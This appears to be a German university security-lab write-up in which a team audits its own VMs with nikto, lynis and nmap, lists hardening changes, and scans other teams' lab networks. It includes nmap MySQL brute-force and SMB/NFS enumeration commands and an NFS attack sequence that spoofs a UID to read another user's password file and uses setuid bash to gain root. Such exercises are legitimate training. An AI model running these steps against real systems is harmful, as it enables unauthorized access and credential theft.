# Aufgabenblatt 11

- gegeben: Angreifer hat Zugriff auf Netzwerk + lokale Kennung
- Sicherheitsüberprüfung aller VMs -> schließen gefundener Sicherheitslücken
- Suche nach Sicherheitslücken bei anderen Teams
- Installation von Programmen zum Schutz (wie Intrusion Detection)
- Beurteilen des eingesetzten Tools nach Wirksamkeit
- Dokumentation gefundener Sicherheitslücken und wie geschlossen in den folgenden Kategorien:
  - Eigene VMs, local exploit
  - Eigene VMs, remote exploit
  - Andere VMs, local exploit
  - Andere VMs, remote exploit

## Teilaufgaben


### 1. Verwendete Tools und Wirksamkeit

- `nmap` zur Identifizierung von offenen Ports
- `lynis` zur Identifizierung von Schwachstellen in Linux-Systemen
- `joh` zur Identifizierung von schwachen Passwörtern
- `metasploit` zum Testen von DNS Amplification Attacken
- `rkhunter` als Rootkit Hunter

#### 1.1 nikto

nikto ist ein open soruce Webserver Scanner, der Webserver auf bekannte Sicherheitslücken, Fehlkonfigurationen und Schwachstellen scannt. Wir haben nikto auf allen webservern von vm6 mit `nikto -h http://web1.psa-team03.cit.tum.de -C all` ausgeführt. Dabei haben wir keine Sicherheitslücken gefunden haben aber ein paar warmings bekommen wobei bei http 2 warnungen und bei https noch zwei weitere warnungen aufgetreten sind. Die Warnungen waren:

- `X-Frame-Options header not set` welche dem browser sagt ob die webseite in einen frame oder iframe geladen werden darf. Zwar ist das für uns keine wirkliche relevante sicherheitslücke da wir keine sensitiven interaktionen auf der webseite haben. Die Lösung ist aber einfach ein `add_header X-Frame-Options "SAMEORIGIN";` in der nginx config hinzufügen weshalb wir dies auch gemacht haben.
- `X-Content-Type-Options header not set` welche gegen gewisse XSS Angriffe als auch vor Missinterpretationen des Content-Types schützt. Auch hier ist die Lösung einfach ein `add_header X-Content-Type-Options "nosniff";` in der nginx config hinzufügen weshalb wir dies auch gemacht haben.
- als nächstes wurde angekreidet das wir HSTS nicht aktiviert haben. HSTS ist ein header welcher dem browser sagt das er die seite nur über https laden soll. Da die Webserver aber laut Aufgabenstellung auch unter http erreichbar sein sollen haben wir dies nicht gemacht.
- als letztes wurde bemängelt das es sich beim SSL Zertifikat um ein Wildcard Zertifikat handelt. Dies ist zwar nicht unsicher aber es wird empfohlen für kritische subdomains individuelle Zertifikate zu verwenden. Da wir aber keine kritischen subdomains haben und dies auch so von der Aufgabenstellung vorgegeben ist haben wir dies nicht geändert.

Das tool ist durachaus nützlich um sicherheitslücken in webservern zu finden war aber in unseren Fall nicht all zu hilfreich da unsere Webserver sher simple sind und keine kritischen daten enthalten.

andere teams:

- team 1: 
- team 2:


#### 1.2 lynis

lynis ist ein open source Sicherheitsaudit-Tool für Unix-Systeme. Es scannt das System auf Schwachstellen, Sicherheitslücken und Konfigurationsfehler. Wir haben lynis auf unseren VMs mit `lynis audit system` ausgeführt. Zusammengefasst haben wir das folgende Ergebnis erhalten:

- Kernel: alles in Ordnung
- Memory and Processes: alles in Ordnung
- Users, Groups and Authentication: bis auf `locked accounts` nichts relevantes
- Shells: alles in Ordnung
- File Systems: alles in Ordnung (nur Enpfehlungen wie extra Partitionen für /home)
- Storage, USB, NFS: alles in Ordnung
- Name Services, Networking: alles in Ordnung bis auf `DNSSEC support unknown`
- Software firewalls: alles in Ordnung bis auf `unused rules`
- SSH: alles in Ordnung aber hardening empfohlen
- rest alles in Ordnung bis auf kernel hardening empfohlen

Insgesamt hat lynis keine Sicherheitslücken gefunden, sondern nur Empfehlungen für die Verbesserung der Sicherheit gegeben. Das Tool ist sehr nützlich, um Schwachstellen und Konfigurationsfehler zu finden und zu beheben. Die meisten Empfehlungen sind für uns nicht relevant aber die bezüglich der locked accounts, Firewall und SSH sind durchaus sinnvoll und haben wir wie folgt umgesetzt:

- locked accounts: TODO
- Firewall: TODO
- SSH: AllowTcpForwarding -> no, ClientAliveCountMax -> 2, MaxAuthTries -> 3, MaxSessions -> 2, TCPKeepAlive -> no, AllowAgentForwarding -> no


#### 1.2 nmap

nmap ist ein Netzwerkscanner, der Netzwerke auf offene Ports, Dienste und Sicherheitslücken scannt. Wir haben mit dem folgenden Skript von vm1 all unsere VMs gescannt:

```bash
#!/usr/bin/env bash

# Define the subnet to scan
subnet="192.168.6.0/24"
temp_file=$(mktemp)
hosts_file=$(mktemp)

echo "Performing host discovery on ${subnet}..."
nmap -sn $subnet -oG - | awk '/Up$/{print $2}' > $hosts_file

echo "Scanning live hosts for open ports..."
while IFS= read -r ip; do
    echo "Scanning ${ip}..."
    nmap -oG - -p 1-65535 "$ip" | grep -v "^#" >> $temp_file
done < $hosts_file

# Print results
echo ""
echo "Scan Results:"
echo "---------------------"
printf "%-15s %-40s %-70s\n" "IP Address" "Hostname" "Open Ports (with Service)"
echo "---------------------------------------------------------------------------------------------------------------"

cat $temp_file | awk '
/Up$/{ip=$2; hostname=$3}
/open/{print ip, hostname, $0}
' | awk '{
    # Extract open ports and services
    open_ports = ""
    for (i = 5; i <= NF; i++) {
        if ($i ~ /open/) {
            # Extract port, protocol, and service
            split($i, parts, "/")
            port_num = parts[1]
            service = parts[5]
            # Colorize port number (green) and service name (cyan) using ANSI escape codes
            open_ports = open_ports "\033[32m" port_num "\033[0m/open/tcp/\033[36m" service "\033[0m "
        }
    }
    # Print formatted output with columns
    printf "%-15s %-40s %-70s\n", $1, $2, open_ports
}'

rm $temp_file
rm $hosts_file
```

und folgendes Ergebnis erhalten:

```bash
IP Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.3.1     (vm1.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5355/open/tcp/llmnr      9100/open/tcp/jetdirect 
192.168.3.2     (vm2.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5432/open/tcp/postgresql 9100/open/tcp/jetdirect   9101/open/tcp/jetdirect 
192.168.3.3     (ns1.psa-team03.cit.tum.de)              22/open/tcp/ssh 53/open/tcp/domain   111/open/tcp/rpcbind     8123/open/tcp/polipo      9100/open/tcp/jetdirect 9101/open/tcp/jetdirect 9153/open/tcp/ 
192.168.3.4     (vm4.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5432/open/tcp/postgresql 
192.168.3.5     (vm5.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 5355/open/tcp/llmnr      8080/open/tcp/http-proxy  8123/open/tcp/polipo    18555/open/tcp/ 
192.168.3.6     (vm6.psa-team03.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     111/open/tcp/rpcbind     443/open/tcp/https        5355/open/tcp/llmnr     9100/open/tcp/jetdirect 9101/open/tcp/jetdirect 9102/open/tcp/jetdirect 41027/open/tcp/ 
192.168.3.7     (vm7.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 389/open/tcp/ldap 
192.168.3.8     (vm8.psa-team03.cit.tum.de)              22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs       5355/open/tcp/llmnr     9100/open/tcp/jetdirect 20048/open/tcp/mountd   33469/open/tcp/ 33761/open/tcp/ 
192.168.3.9     (vm9.psa-team03.cit.tum.de)              22/open/tcp/ssh 25/open/tcp/smtp     111/open/tcp/rpcbind     9154/open/tcp/ 
192.168.3.10    (vm10.psa-team03.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 3000/open/tcp/ppp        9090/open/tcp/zeus-admin  9100/open/tcp/jetdirect 9115/open/tcp/ 
```

team2:

```bash
IP Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.2.1     (ns.psa-team02.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain   5666/open/tcp/nrpe       8123/open/tcp/polipo 
192.168.2.2     (vm2.psa-team02.cit.tum.de)              22/open/tcp/ssh 5666/open/tcp/nrpe   8123/open/tcp/polipo 
192.168.2.3     (vm3.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
192.168.2.4     (db.psa-team02.cit.tum.de)               22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
192.168.2.5     (dbm.psa-team02.cit.tum.de)              22/open/tcp/ssh 3306/open/tcp/mysql  5666/open/tcp/nrpe       8123/open/tcp/polipo 
192.168.2.6     (cloudserv.psa-team02.cit.tum.de)        22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
192.168.2.7     (fileserver.psa-team02.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs     5666/open/tcp/nrpe 8123/open/tcp/polipo 
192.168.2.8     (ldap.psa-team02.cit.tum.de)             22/open/tcp/ssh 389/open/tcp/ldap    636/open/tcp/ldapssl     5666/open/tcp/nrpe        8123/open/tcp/polipo 
192.168.2.9     (mail.psa-team02.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp     110/open/tcp/pop3        143/open/tcp/imap         5666/open/tcp/nrpe    8123/open/tcp/polipo 
192.168.2.10    (due.psa-team02.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http     443/open/tcp/https       5666/open/tcp/nrpe        8123/open/tcp/polipo 
```

team4:

```bash
192.168.4.1     (ns.psa-team04.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
192.168.4.3     (vm04-03.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.4     (vm04-04.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.5     (vm04-05.psa-team04.cit.tum.de)          22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
192.168.4.6     (vm04-06.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.8     (vm04-08.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.9     (vm04-09.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.10    (vm04-10.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.11    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.12    (fileserver.psa-team04.cit.tum.de)       22/open/tcp/ssh 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
192.168.4.13    (mail.psa-team04.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.14    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.15    ()                                       22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.20    (vm04-20.psa-team04.cit.tum.de)          22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.4.22    (ldap.psa-team04.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
192.168.4.43    (vm04-04-ip43.psa-team04.cit.tum.de)     22/open/tcp/ssh 8123/open/tcp/polipo 
```
-> no nfs share


team5:

```bash
IP Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.5.1     (vm01.psa-team05.cit.tum.de)             22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
192.168.5.2     (vm02.psa-team05.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
192.168.5.3     (vm03.psa-team05.cit.tum.de)             8123/open/tcp/polipo                                
192.168.5.4     (vm04.psa-team05.cit.tum.de)             22/open/tcp/ssh 5432/open/tcp/postgresql 8123/open/tcp/polipo 
192.168.5.5     (vm05.psa-team05.cit.tum.de)             22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.5.6     (vm06.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 636/open/tcp/ldapssl 8123/open/tcp/polipo 9000/open/tcp/cslistener 
192.168.5.7     (vm07.psa-team05.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 4000/open/tcp/remoteanything 4001/open/tcp/newoak 4002/open/tcp/mlchat-proxy 8123/open/tcp/polipo 9000/open/tcp/cslistener 
192.168.5.8     (vm08.psa-team05.cit.tum.de)             22/open/tcp/ssh 25/open/tcp/smtp 143/open/tcp/imap 8123/open/tcp/polipo 9000/open/tcp/cslistener 9154/open/tcp/ 
192.168.5.9     ()                                       22/open/tcp/ssh 80/open/tcp/http 8123/open/tcp/polipo 
192.168.5.200   (web.psa-team05.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 
```

-> nfs on 192.168.5.7 mit /16


team6:

```bash
P Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.6.1     (shika.psa-team06.cit.tum.de)            22/open/tcp/ssh 53/open/tcp/domain 3000/open/tcp/ppp 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.2     (nm2acs.netz.lrz.de)                     22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.3     (neko.psa-team06.cit.tum.de)             22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2368/open/tcp/opentable 8123/open/tcp/polipo 9100/open/tcp/jetdirect 50727/open/tcp/ 
192.168.6.4     (alphonse.psa-team06.cit.tum.de)         22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.5     (edward.psa-team06.cit.tum.de)           22/open/tcp/ssh 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.6     (kumo.psa-team06.cit.tum.de)             22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.7     (fileserver.psa-team06.cit.tum.de)       22/open/tcp/ssh 111/open/tcp/rpcbind 139/open/tcp/netbios-ssn 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.8     (ldap.psa-team06.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.9     (meiru.psa-team06.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
192.168.6.69    (web.psa-team06.cit.tum.de)              22/open/tcp/ssh 80/open/tcp/http 443/open/tcp/https 8123/open/tcp/polipo 9100/open/tcp/jetdirect 
```

-> fileserver auf 192.168.6.7 aber nicht /16 ?

team7:

```bash
#nothing relevant
```

team8:

```bash
P Address      Hostname                                 Open Ports (with Service)                                             
---------------------------------------------------------------------------------------------------------------
192.168.8.3     (vm003.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.8.4     (vm004.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.8.5     (vm005.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo 
192.168.8.6     (ns.psa-team08.cit.tum.de)               22/open/tcp/ssh 53/open/tcp/domain 8123/open/tcp/polipo 
192.168.8.7     (vm007.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.8.9     (vm009.psa-team08.cit.tum.de)            22/open/tcp/ssh 3306/open/tcp/mysql 8123/open/tcp/polipo 
192.168.8.10    (vm010.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.8.11    (grafana.psa-team08.cit.tum.de)          22/open/tcp/ssh 111/open/tcp/rpcbind 443/open/tcp/https 2003/open/tcp/finger 2004/open/tcp/mailbox 2023/open/tcp/xinuexpansion3 2024/open/tcp/xinuexpansion4 3001/open/tcp/nessus 3002/open/tcp/exlm-agent 8123/open/tcp/polipo 8126/open/tcp/ 43153/open/tcp/ 
192.168.8.12    (vm012.psa-team08.cit.tum.de)            22/open/tcp/ssh 111/open/tcp/rpcbind 445/open/tcp/microsoft-ds 2049/open/tcp/nfs 8123/open/tcp/polipo 
192.168.8.13    (ldap.psa-team08.cit.tum.de)             22/open/tcp/ssh 636/open/tcp/ldapssl 8123/open/tcp/polipo 
192.168.8.14    (vm014.psa-team08.cit.tum.de)            22/open/tcp/ssh 25/open/tcp/smtp 110/open/tcp/pop3 111/open/tcp/rpcbind 143/open/tcp/imap 993/open/tcp/imaps 995/open/tcp/pop3s 8123/open/tcp/polipo 
192.168.8.15    (vm015.psa-team08.cit.tum.de)            22/open/tcp/ssh 8123/open/tcp/polipo 
192.168.8.254   (router.psa-team08.cit.tum.de)           22/open/tcp/ssh 111/open/tcp/rpcbind 8123/open/tcp/polipo
```

-> fileserver auf 192.168.8.12 aber ohne /16?

team9

```bash

```

-> fileserver auf 192.168.9.14 aber ohne /16?


team 10

```bash

```

-> fileserver auf 192.168.10.8 mit /16


##### SQL
mysql enumeration: versucht alle Datenbanken auf einem MySQL-Server zu enumerieren
`nmap -p 3306 --script mysql-enum.nse <target>`
mysql-brute: versucht ob der root user mit einem leeren Passwort auf einem MySQL-Server einloggen kann
`nmap -p 3306 --script mysql-brute.nse <target>`

##### SMB
aufzählung aller shares auf einem SMB-Server
`nmap -p 139,445 --script smb-enum-shares.nse <target>`
aufzählung aller Benutzer auf einem SMB-Server
`nmap -p 139,445 --script smb-enum-users.nse <target>`

##### NFS
aufzählung aller NFS-Exporte auf einem Server
`nmap -p 111 --script nfs-ls.nse <target>`
show mounts
`showmount -e <IP>`
mounting eines NFS-Exports

```bash
mkdir -p /mnt/nfs
mount -t nfs 192.168.5.7:/export /mnt/nfs -o nolock
ls -la /mnt/nfs
# -> ckeck permissions
# find /mnt/nfs -writable
# crontab -l
# cp $(which bash) .
# chmod +s bash
# ./bash -p
# cp bash to atten home dir -> login as atten nd execute ./bash -p -> root
useradd -m -u 10021 -G students newuser
passwd newuser
umount /mnt/nfs
mount -t nfs 192.168.5.7:/export/atten /mnt/nfs -o nolock
su - newuser
cd /mnt/nfs
cat atten.password
# check if permissions -> if yes copy bash | else at least as atten user write and read permissions
find /mnt/nfs -writable
```

##### webserver

##### mailserver

##### ldap

##### ssh

##### webanwendung

##### dns




### 2. Dokumentation gefundener Sicherheitslücken

bekannt:

- kein tls bei mail
- nfs unverschlüsselt
- communikation mit datenbank unverschlüsselt?
- communikation prometheus offen

#### 2.1. Eigene VMs, local exploit

#### 2.2. Eigene VMs, remote exploit

#### 2.3. Andere VMs, local exploit

#### 2.4. Andere VMs, remote exploit

### 3. Schließung gefundener Sicherheitslücken und Sicherheitsmaßnahmen

- `aideinit` als Intrusion Detection System
